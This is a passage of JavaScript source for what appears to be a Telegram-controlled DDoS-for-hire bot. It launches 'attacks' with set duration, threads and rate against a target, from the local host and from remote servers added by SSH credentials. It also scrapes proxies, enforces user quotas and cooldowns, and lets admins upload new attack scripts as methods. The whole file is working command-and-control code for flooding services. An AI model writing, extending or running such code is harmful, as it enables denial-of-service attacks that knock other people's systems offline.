    if (isBlacklisted(t.host)) return reply(msg, `🚫 \`${esc(t.host)}\` blacklisted.`);
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) { return reply(msg, `❌ ${e.message}`); }

  // Resolve targets
  let useLocal = false;
  let serversToUse = [];

  if (!override) {
    // DEFAULT: local + all online
    useLocal = true;
    serversToUse = loadServers().filter(s => s.status === 'online');
  } else if (override === 'local') {
    useLocal = true;
  } else if (override === 'all') {
    useLocal = true;
    serversToUse = loadServers().filter(s => s.status === 'online');
  } else {
    const ids = override.split(',').map(x => x.trim()).filter(Boolean);
    for (const sid of ids) {
      const s = getServer(sid);
      if (!s) return reply(msg, `❌ Not found: \`${sid}\``);
      if (s.status !== 'online') return reply(msg, `⚠️ \`${sid}\` is ${s.status}. /servercheck ${sid}`);
      serversToUse.push(s);
    }
  }

  const stats = serverStats();
  const totalTargets = (useLocal ? 1 : 0) + serversToUse.length;
  if (totalTargets === 0) return reply(msg, '❌ No targets available.');

  // Progress
  const progress = await reply(msg,
    `🚀 *Dispatching* ${method.name}\n` +
    `Target: \`${esc(parsed.target)}\`\n` +
    `Duration ${parsed.duration}s · Threads ${parsed.threads} · Rate ${parsed.rate}\n\n` +
    `Sending to ${totalTargets} target(s)...`);

  const launched = [];
  let done = 0;

  // Local
  if (useLocal) {
    try {
      const session = launchLocal(user, method, parsed.args);
      launched.push({ ok: true, session, label: 'LOCAL', icon: '💻' });
    } catch (e) {
      launched.push({ ok: false, error: e.message, label: 'LOCAL', icon: '💻' });
    }
    done++;
    await edit(msg.chat.id, progress.message_id,
      `🚀 *Dispatching* ${method.name}\n\n` +
      `${done}/${totalTargets} targets processed...`);
  }

  // Remotes in parallel
  await Promise.all(serversToUse.map(async (s) => {
    try {
      const session = await launchRemote(user, method, parsed.args, s.id);
      launched.push({ ok: true, session, label: s.name, icon: '🌐' });
    } catch (e) {
      launched.push({ ok: false, error: e.message, label: s.name, icon: '🌐' });
    }
    done++;
    await edit(msg.chat.id, progress.message_id,
      `🚀 *Dispatching* ${method.name}\n\n` +
      `${done}/${totalTargets} targets processed...`);
  }));

  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  audit('attack_launched', msg.from.id, {
    method: method.id, target: parsed.target,
    local: useLocal, servers: serversToUse.map(s => s.id),
    ok: launched.filter(l => l.ok).length,
  });

  const okCount = launched.filter(l => l.ok).length;
  const failCount = launched.filter(l => !l.ok).length;
  const newStats = serverStats();

  const lines = [
    `✅ *Attack dispatched*`,
    ``,
    `Method: *${method.name}*`,
    `Target: \`${esc(parsed.target)}\``,
    `Duration ${parsed.duration}s · Threads ${parsed.threads} · Rate ${parsed.rate}`,
    ``,
    `📡 *Servers:* ${newStats.online}/${newStats.total} online · *${newStats.attacking}* attacking`,
    `🎯 *Launched:* ${okCount}/${totalTargets} target(s)`,
    ``,
  ];

  for (const l of launched) {
    if (l.ok) {
      lines.push(`${l.icon} \`${l.session.id}\` — ${esc(l.label)}`);
    } else {
      lines.push(`${l.icon} ❌ ${esc(l.label)}: _${esc(l.error.slice(0, 60))}_`);
    }
  }

  lines.push('');
  lines.push(`Stop: \`/stop <session_id>\` · Status: \`/status\``);

  await edit(msg.chat.id, progress.message_id, lines.join('\n'));
});

/* ───── /status ───── */

cmd('status', async (msg) => {
  const user = ensureUserExists(msg);
  const mine = [...sessions.values()].filter(s => s.owner === msg.from.id && s.status === 'running');
  const stats = serverStats();

  const header = `📡 *Global:* ${stats.online}/${stats.total} online · *${stats.attacking}* attacking\n`;

  if (mine.length === 0) return reply(msg, header + '\n📭 No active sessions.');

  const txt = [header, `*Your sessions (${mine.length}):*`, ''];
  const byServer = {};
  mine.forEach(s => {
    const key = s.where === 'local' ? 'LOCAL' : s.serverName;
    (byServer[key] = byServer[key] || []).push(s);
  });

  Object.entries(byServer).forEach(([label, list]) => {
    txt.push(`*${esc(label)}*`);
    list.forEach(s => {
      const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
      txt.push(`  \`${s.id}\` — ${s.methodName} · ${esc(s.target)}`);
      txt.push(`    ${elapsed}s/${s.duration}s`);
    });
    txt.push('');
  });

  await reply(msg, txt.join('\n'));
});

/* ───── /stop ───── */

cmd('stop', async (msg, args) => {
  const user = ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/stop <id>`');
  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not your session.');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped \`${id}\``);
});

/* ───── /scrape ───── */

cmd('scrape', async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') return reply(msg, '❌ Denied.');
  await reply(msg, '🔄 Scraping...');
  try {
    const n = await scrapeProxies();
    await reply(msg, `✅ *${n}* proxies → \`${CONFIG.PROXY_FILE}\`\n\n_Sync to servers: /syncall_`);
  } catch (e) { await reply(msg, `❌ ${e.message}`); }
});

/* ══════════════════════════ ADMIN: USERS ══════════════════════════ */

cmd('users', async (msg) => {
  if (!adminOnly(msg)) return;
  const list = Object.values(loadUsers());
  if (!list.length) return reply(msg, '_No users._');
  const txt = [`*Users (${list.length}):*`, ''];
  list.forEach(u => {
    const l = u.limits || {};
    const icon = u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳';
    txt.push(`${icon} \`${u.telegramId}\` ${esc(u.firstName || u.username || '')} · ${u.role}`);
    txt.push(`  dur=${l.maxDuration || '∞'} th=${l.maxThreads || '∞'} rate=${l.maxRate || '∞'} cd=${l.cooldown || 0}s`);
  });
  await reply(msg, txt.join('\n'));
});

cmd('approve', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/approve <id>`');
  if (!getUser(id)) return reply(msg, '❌ Not found.');
  upsertUser(id, { role: 'user' });
  await reply(msg, `✅ \`${id}\` approved.`);
});

cmd('ban', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/ban <id>`');
  if (isAdmin(id)) return reply(msg, '❌ Cannot ban admin.');
  if (!getUser(id)) return reply(msg, '❌ Not found.');
  upsertUser(id, { role: 'banned' });
  await reply(msg, `🚫 \`${id}\` banned.`);
});

cmd('adduser', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/adduser <id>`');
  if (getUser(id)) return reply(msg, '⚠️ Exists.');
  upsertUser(id, {
    telegramId: id, role: 'user', createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
  await reply(msg, `✅ \`${id}\` created.`);
});

cmd('setlimit', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const [idStr, field, valStr] = args;
  const id = Number(idStr), value = Number(valStr);
  if (!id || !field || isNaN(value)) return reply(msg, 'Usage: `/setlimit <id> <maxDuration|maxThreads|maxRate|maxConcurrent|cooldown> <val>`');
  if (!['maxDuration', 'maxThreads', 'maxRate', 'maxConcurrent', 'cooldown'].includes(field)) return reply(msg, '❌ Field invalid.');
  const u = getUser(id);
  if (!u) return reply(msg, '❌ Not found.');
  upsertUser(id, { limits: { ...(u.limits || {}), [field]: value } });
  await reply(msg, `✅ \`${id}\` ${field}=${value}`);
});

cmd('blacklist', async (msg) => {
  if (!adminOnly(msg)) return;
  const l = loadBlacklist();
  if (!l.length) return reply(msg, '_Empty._');
  await reply(msg, '*Blacklisted:*\n' + l.map(h => `• \`${esc(h)}\``).join('\n'));
});

cmd('black', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const h = normalizeHost(args[0]);
  if (!h) return reply(msg, 'Usage: `/black <host>`');
  const l = loadBlacklist();
  if (l.includes(h)) return reply(msg, '⚠️ Already.');
  l.push(h); saveBlacklist(l);
  await reply(msg, `✅ Blocked \`${esc(h)}\``);
});

cmd('unblack', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const h = normalizeHost(args[0]);
  const l = loadBlacklist();
  const i = l.indexOf(h);
  if (i < 0) return reply(msg, '❌ Not found.');
  l.splice(i, 1); saveBlacklist(l);
  await reply(msg, `✅ Removed \`${esc(h)}\``);
});

cmd('stats', async (msg) => {
  if (!adminOnly(msg)) return;
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const s = serverStats();
  const active = [...sessions.values()].filter(x => x.status === 'running').length;
  const local = [...sessions.values()].filter(x => x.status === 'running' && x.where === 'local').length;
  const remote = active - local;

  await reply(msg, [
    `*Global Stats*`,
    ``,
    `👥 Users: *${total}* (${admins} admin, ${pending} pending)`,
    `📡 Servers: *${s.online}/${s.total}* online · *${s.attacking}* attacking`,
    `⚔️ Sessions: *${active}* (💻${local} local / 🌐${remote} remote)`,
    `🚫 Blacklist: ${loadBlacklist().length}`,
    `📦 Methods: ${availableMethods().length}`,
    `📁 Proxy: ${fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE)) ? '✅' : '❌'}`,
  ].join('\n'));
});

/* ───── /uploadmethod /addmethod /delmethod ───── */

cmd('uploadmethod', async (msg) => {
  if (!adminOnly(msg)) return;
  await reply(msg, '📎 Send `.js` file as document.');
  pendingInput.set(msg.from.id, { action: 'await_method_file', expires: Date.now() + 300000 });
});

cmd('addmethod', async (msg, args) => {
  if (!adminOnly(msg)) return;
  if (args.length < 4) return reply(msg,
    '*Add custom method*\n\n`/addmethod <id> <name> <file.js> <template>`\n\n' +
    'Template placeholders: `$1 $2 $3 $4` for args, `{proxy}` for proxy path\n\n' +
    'Example:\n`/addmethod myatk "My Attack" myatk.js "$1 $2 $3 $4 -c -h"`');
  const [id, name, file, ...tpl] = args;
  const template = tpl.join(' ');
  if (!/^[a-zA-Z0-9_-]{2,20}$/.test(id)) return reply(msg, '❌ ID invalid.');
  if (allMethods().some(m => m.id === id)) return reply(msg, '❌ Exists.');
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, file))) return reply(msg, `❌ File \`${file}\` missing. /uploadmethod first.`);
  const list = loadCustomMethods();
  list.push({ id, name, file, template, example: `${id} <args...>`, addedBy: msg.from.id, addedAt: new Date().toISOString() });
  saveCustomMethods(list);
  await reply(msg, `✅ Added \`${id}\`\n\nTry: \`/attack ${id} <args...>\``);
});

cmd('delmethod', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/delmethod <id>`');
  if (BUILTIN_METHODS.some(m => m.id === id)) return reply(msg, '❌ Built-in.');
  const list = loadCustomMethods();
  const i = list.findIndex(m => m.id === id);
  if (i < 0) return reply(msg, '❌ Not found.');
  list.splice(i, 1);
  saveCustomMethods(list);
  await reply(msg, `✅ Deleted \`${id}\``);
});

cmd('cancel', async (msg) => {
  pendingInput.delete(msg.from.id);
  await reply(msg, '❎ Cancelled.');
});

/* ══════════════════════════ ROUTER ══════════════════════════ */

bot.on('message', async (msg) => {
  if (msg.document) {
    const p = pendingInput.get(msg.from.id);
    if (!p || p.action !== 'await_method_file') return;
    if (p.expires && Date.now() > p.expires) { pendingInput.delete(msg.from.id); return reply(msg, '⏰ Expired.'); }
    const fn = msg.document.file_name || 'method.js';
    if (!fn.endsWith('.js')) return reply(msg, '❌ Must be .js');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const tp = path.join(CONFIG.SCRIPT_DIR, fn);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((res, rej) => {
        const w = fs.createWriteStream(tp);
        r.data.pipe(w);
        w.on('finish', res);
        w.on('error', rej);
      });
      pendingInput.delete(msg.from.id);
      await reply(msg, `✅ Uploaded: \`${fn}\`\n\nRegister:\n\`/addmethod <id> <name> ${fn} "$1 $2 $3 $4"\``);
    } catch (e) { await reply(msg, `❌ ${e.message}`); }
    return;
  }

  if (!msg.text) return;
  const text = msg.text.trim();

  const pending = pendingInput.get(msg.from.id);
  if (pending && (!pending.expires || Date.now() < pending.expires)) {
    return handlePending(msg, pending, text);
  }

  if (!text.startsWith('/')) return;
  const parts = text.slice(1).split(/\s+/);
  const cmdName = parts[0].split('@')[0].toLowerCase();
  const args = parts.slice(1);
  const h = COMMANDS.get(cmdName);
  if (!h) return;

  try { await h(msg, args); }
  catch (e) { console.error(`[${cmdName}]`, e); try { await reply(msg, `❌ ${e.message}`); } catch {} }
});

/* ══════════════════════════ INTERACTIVE ══════════════════════════ */

async function handlePending(msg, pending, text) {
  if (text === '/cancel') { pendingInput.delete(msg.from.id); return reply(msg, '❎ Cancelled.'); }
  const data = pending.data || {};

  switch (pending.action) {
    case 'addserver_addr':
      if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ `ip:port`');
      data.addr = text;
      pending.action = 'addserver_user';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, '👤 SSH username:');
    case 'addserver_user':
      data.username = text;
      pending.action = 'addserver_pass';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, '🔑 Password:');
    case 'addserver_pass':
      data.password = text;
      pending.action = 'addserver_name';
      pendingInput.set(msg.from.id, pending);
      try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}
      return reply(msg, '🏷 Server name (or `/skip`):');
    case 'addserver_name':
      const name = text === '/skip' ? data.addr.split(':')[0] : text;
      pendingInput.delete(msg.from.id);
      return addServerFlow(msg, data.addr, data.username, data.password, name);
  }
}

/* ══════════════════════════ STARTUP ══════════════════════════ */

(async () => {
  console.log('[bot] starting v2...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);
  console.log('[bot] methods:', availableMethods().map(m => m.id).join(', ') || '(none)');

  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin', createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] admin ${id} bootstrapped`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  // Refresh servers in background
  const servers = loadServers();
  if (servers.length > 0) {
    console.log(`[bot] refreshing ${servers.length} server statuses...`);
    refreshAllServers(true).then(r => {
      console.log(`[bot] servers: ${r.online}/${r.total} online`);
    }).catch(() => {});
  }

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] scraping proxies...');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch (e) { console.error('[bot]', e.message); }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] bye'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] bye'); process.exit(0); });